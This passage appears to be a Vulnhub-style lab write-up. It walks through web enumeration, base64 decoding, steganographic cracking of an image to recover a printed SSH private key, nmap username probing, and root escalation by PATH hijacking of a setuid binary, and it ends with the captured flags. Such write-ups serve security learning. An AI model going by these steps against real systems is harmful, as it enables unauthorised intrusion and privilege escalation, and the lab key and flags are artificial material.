  -H 'accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'priority: u=2, i' \
  -H 'referer: http://10.0.0.34/' \
  -H 'sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: image' \
  -H 'sec-fetch-mode: no-cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-storage-access: none' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'

#### Loadable image

curl 'https://wallpapercave.com/wp/wp5385322.jpg' \
  -H 'accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'priority: u=2, i' \
  -H 'referer: http://10.0.0.34/' \
  -H 'sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: image' \
  -H 'sec-fetch-mode: no-cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-storage-access: none' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'

#### /index.html

On the end of the page, we can see a base64 encoded string

echo VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 --decode >>
    UkZKQlIwOU9JRUpCVEV3PQ==

echo UkZKQlIwOU9JRUpCVEV3PQ== | base64 --decode >>
    RFJBR09OIEJBTEw=

echo RFJBR09OIEJBTEw= | base64 --decode
    DRAGON BALL

This could be the hidden dir, so we do

http://10.0.0.34/DRAGON BALL/

And find secrets.txt with:
```
    /facebook.com
    /youtube.com
    /google.com
    /vanakkam nanba
    /customer
    /customers
    /taxonomy
    /username
    /passwd
    /yesterday
    /yshop
    /zboard
    /zeus
    /aj.html
    /zoom.html
    /zero.html
    /welcome.html
```

And /Vulnhub with:
- login.html
- aj.jpg

With this, we download the aj.jpg and check if there is any hidden information on the image (stegnography)

stegcracker /home/kali/Downloads/aj.jpg 
```
    StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
    Copyright (c) 2025 - Luke Paris (Paradoxis)

    StegCracker has been retired following the release of StegSeek, which 
    will blast through the rockyou.txt wordlist within 1.9 second as opposed 
    to StegCracker which takes ~5 hours.

    StegSeek can be found at: https://github.com/RickdeJager/stegseek

    No wordlist was specified, using default rockyou.txt wordlist.
    Counting lines in wordlist..
    Attacking file '/home/kali/Downloads/aj.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
    Successfully cracked file with password: love
    Tried 387 passwords
    Your file has been written to: /home/kali/Downloads/aj.jpg.out
    love
```

/home/kali/Downloads/aj.jpg.out has the following content:
```
    -----BEGIN OPENSSH PRIVATE KEY-----
    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
    Bd8180GtBAAaGtiwAAAAlrYWxpQGthbGk=
    -----END OPENSSH PRIVATE KEY-----
```

With this ssh key, we try to brute force the username

Here, xmen attempt was used because when we go to http://10.0.0.34/DRAGON%20BALL/Vulnhub/login.html, it appears "WELCOME TO xmen"

nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "aj", "xmen"}, privatekeys={"/home/kali/Downloads/aj.jpg.out"}' 10.0.0.34
```
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 19:44 EST
    NSE: [ssh-publickey-acceptance] Failed to authenticate
    NSE: [ssh-publickey-acceptance] Failed to authenticate
    NSE: [ssh-publickey-acceptance] Found accepted key: /home/kali/Downloads/aj.jpg.out for user xmen
    Nmap scan report for 10.0.0.34
    Host is up (0.018s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    | ssh-publickey-acceptance: 
    |   Accepted Public Keys: 
    |_    Key /home/kali/Downloads/aj.jpg.out accepted for user xmen

    Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
```

When trying to ssh we get:
ssh -i /home/kali/Downloads/aj.jpg.out xmen@10.0.0.34
```
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    Permissions 0664 for '/home/kali/Downloads/aj.jpg.out' are too open.
    It is required that your private key files are NOT accessible by others.
    This private key will be ignored.
    Load key "/home/kali/Downloads/aj.jpg.out": bad permissions
    xmen@10.0.0.34's password: 
```

We do:
```
# make sure you own the file
sudo chown $(whoami):$(whoami) /home/kali/Downloads/aj.jpg.out

# set strict permissions so only you can read/write
chmod 600 /home/kali/Downloads/aj.jpg.out
```

And if we ssh, we have ssh access, if we do ls we have the local.txt that contains our 1st flag
your falg :192fb6275698b5ad9868c7afb62fd555

#### /robots.txt

As a base64 string 'eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=' that means

echo -n "eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI=" | base64 --decode
```
   you find the hidden dir
```

#### gobuster

gobuster dir -u http://10.0.0.34/ -w /home/kali/wordlists/SecLists/Discovery/Web-Content/common.txt
```
    ===============================================================
    Gobuster v3.8
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.0.0.34/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /home/kali/wordlists/SecLists/Discovery/Web-Content/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 274]
    /.htaccess            (Status: 403) [Size: 274]
    /.htpasswd            (Status: 403) [Size: 274]
    /index.html           (Status: 200) [Size: 4355]
    /robots.txt           (Status: 200) [Size: 33]
    /server-status        (Status: 403) [Size: 274]
    Progress: 4750 / 4750 (100.00%)
    ===============================================================
    Finished
    ===============================================================
```


#### Metasploit

Using the nmap, we can check that we have an Apache Webserver, so we aare going to see which vulnerabilities it has using Metasploit. For that we do:

1. `load wmap`  
   > Loads the **WMAP plugin** into Metasploit, which enables web application vulnerability scanning.

2. `wmap_sites -a 10.0.0.34`  
   > Adds a website to the **wmap_sites database** so that it can be scanned for vulnerabilities.

3. `wmap_sites -l`  
   > Lists all sites currently loaded in the **wmap_sites database**, showing their assigned IDs.

4. `wmap_targets -d 0`  
   > Adds a site (ID 0 in this example) to the **directory of targets** for the WMAP scan.

5. `wmap_targets -l`  
   > Lists all current targets in **WMAP**, confirming that the site was added successfully.

6. `wmap_run -t`  
   > Loads all **WMAP scanning modules** that are available to test against the targets.

7. `wmap_run -e`  
   > Executes all loaded **WMAP modules** against the target(s), performing the actual vulnerability scan.

8. `vulns`  
   > Displays a summary of **detected vulnerabilities** after the scan has completed.

This pretty much uses all modules (on db) related with web scanning and uses them against this site to see the vulnerabilities (regardless if it is Apache or not)

We then see the results
```
    Vulnerabilities
    ===============

    Timestamp                Host       Name                                           References
    ---------                ----       ----                                           ----------
    2025-10-25 11:16:57 UTC  10.0.0.20  Wordpress Reflex Gallery Upload Vulnerability  CVE-2015-4133,EDB-36374,OSVDB-88853,WPVDB-7867
```

#### Skipfish

Check folder skipfish-analysisfor more details

skipfish -o skipfish-analysis http://10.0.0.34
```
    skipfish version 2.10b by lcamtuf@google.com                                                                                                                                 
                                                                                                                                                                                
    - 10.0.0.34 -                                                                                                                                                              
                                                                                                                                                                                
    Scan statistics:                                                                                                                                                             
                                                                                                                                                                                
        Scan time : 0:00:02.445                                                                                                                                                
    HTTP requests : 509 (208.1/s), 245 kB in, 89 kB out (137.0 kB/s)                                                                                                           
        Compression : 3 kB in, 8 kB out (46.9% gain)                                                                                                                             
        HTTP faults : 0 net errors, 0 proto errors, 0 retried, 0 drops                                                                                                           
    TCP handshakes : 14 total (36.4 req/conn)                                                                                                                                   
        TCP faults : 0 failures, 0 timeouts, 3 purged                                                                                                                           
    External links : 3 skipped                                                                                                                                                  
    Reqs pending : 0                                                                                                                                                          
                                                                                                                                                                                
    Database statistics:                                                                                                                                                         
                                                                                                                                                                                
            Pivots : 2 total, 2 done (100.00%)                                                                                                                                  
        In progress : 0 pending, 0 init, 0 attacks, 0 dict                                                                                                                       
    Missing nodes : 0 spotted                                                                                                                                                  
        Node types : 1 serv, 1 dir, 0 file, 0 pinfo, 0 unkn, 0 par, 0 val                                                                                                       
    Issues found : 3 info, 0 warn, 3 low, 0 medium, 0 high impact                                                                                                             
        Dict size : 3 words (3 new), 0 extensions, 150 candidates                                                                                                              
        Signatures : 77 total                                                                                                                                                   
                                                                                                                                                                                
    [+] Copying static resources...                                                                                                                                              
    [+] Sorting and annotating crawl nodes: 2                                                                                                                                    
    [+] Looking for duplicate entries: 2                                                                                                                                         
    [+] Counting unique nodes: 2                                                                                                                                                 
    [+] Saving pivot data for third-party tools...                                                                                                                               
    [+] Writing scan description...                                                                                                                                              
    [+] Writing crawl tree: 2                                                                                                                                                    
    [+] Generating summary views...                                                                                                                                              
    [+] Report saved to 'skipfish-analysis/index.html' [0xf9a14cc8].                                                                                                             
    [+] This was a great day for science!
```

#### Nikto

nikto -h 10.0.0.34 -C all
```
    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    + Target IP:          10.0.0.34
    + Target Hostname:    10.0.0.34
    + Target Port:        80
    + Start Time:         2025-11-12 18:14:47 (GMT-5)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.38 (Debian)
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + /: Server may leak inodes via ETags, header found with file /, inode: 1103, size: 5b8297f8e741b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
    + Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
    + OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
    + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
    + 26631 requests: 9 error(s) and 6 item(s) reported on remote host
    + End Time:           2025-11-12 18:29:26 (GMT-5) (879 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
```

Lets convert the ETag on both pages we have access to

##### /index.html

103 → plain integer (likely the file inode or a small file id).

5b8297f8e741b → hex token. In decimal: 1609863256765467.

-gzip → indicates this ETag is for the gzip‑compressed variant of the resource.

##### /robots.txt

21 → file ID / inode

5b8257fa4d2ae (hex) → 160984681197638 decimal → timestamp: 2021-01-05 11:27:58 UTC

### SSH Session

#### ~/shell

ls -al
```
-rw-r--r-- 1 root root    75 Jan  4  2021 demo.c
-rwsr-xr-x 1 root root 16712 Jan  4  2021 shell
```

We can see that there is a 's' in 'shell', this means that when any user runs this script, it will be executed as root, because it will change the UID to root since it is the owner of the file.

We also know that shell is a compilation of demo.c that looks like this 
```
    #include<unistd.h>
    void main()
    { setuid(0);
    setgid(0);
    system("ps");
}
```

If we inject a malicous binary, we can elevate our priviledges

Forthat, we need to create a binary and put a reference to it in $PATH since the 'ps' command is not sepcficied with a full path to the correct bin

```DID NOT WORK 
We check that the VM has python3 and we can create a bin that gives us a reverse shell
Install pyinstaller to create a bin

    pip install pyinstaller

Create the script as is in `script.py` and trigger following command to create bin called 'ps'

    pyinstaller --onefile ../ps-rev-shell-script.py -n ps

Do the following command to copy the binary to through SSH

    scp -i ../../aj.jpg.out -r ps xmen@10.0.0.34:/home/xmen/ps
```

Now if we check $PATH, we can see the following on $PATH

```
    /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

If we put /home/xmen first, the first command it will be recognize by ps it will be our malicious binary, to do that, execute:
    
    export PATH=/home/xmen:$PATH

And now PATH looks like:
    
    /home/xmen:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

Now on /home/xmen do:
```
    # Get high privileges
    echo "/bin/bash" > ps

    # Give permissions to the script
    chmod +x ps

    # Check
    which ps
        /home/xmen/ps
```

If I now execute -/scripts/shell, I am root, byexecuting I can check:
```
    id
        uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
```

Now I go to /root and I can see the proof.txt with flag:
    
    your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2

#### SHC Install

tar xzf shc-3.8.9.tgz                                        
```
    ┌──(kali㉿kali)-[~/bins]
    └─$ wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9.tgz   

    ┌──(kali㉿kali)-[~/bins]
    └─$ tar xzf shc-3.8.9

    ┌──(kali㉿kali)-[~/bins]
    └─$ cd shc-3.8.9      
                                                                                                                                                                                
    ┌──(kali㉿kali)-[~/bins/shc-3.8.9]
    └─$ make install         
    cc -Wall  shc.c -o shc
    ***     Installing shc and shc.1 on /usr/local
    ***     �Do you want to continue? y
    install -c -s shc /usr/local/bin/
    install: cannot create regular file '/usr/local/bin/shc': Permission denied
    make: *** [makefile:77: install] Error 1
                                                                                                                                                                                
    ┌──(kali㉿kali)-[~/bins/shc-3.8.9]
    └─$ sudo make install
    ***     Installing shc and shc.1 on /usr/local
    ***     �Do you want to continue? y
    install -c -s shc /usr/local/bin/
    install -c -m 644 shc.1 /usr/local/man/man1/
```

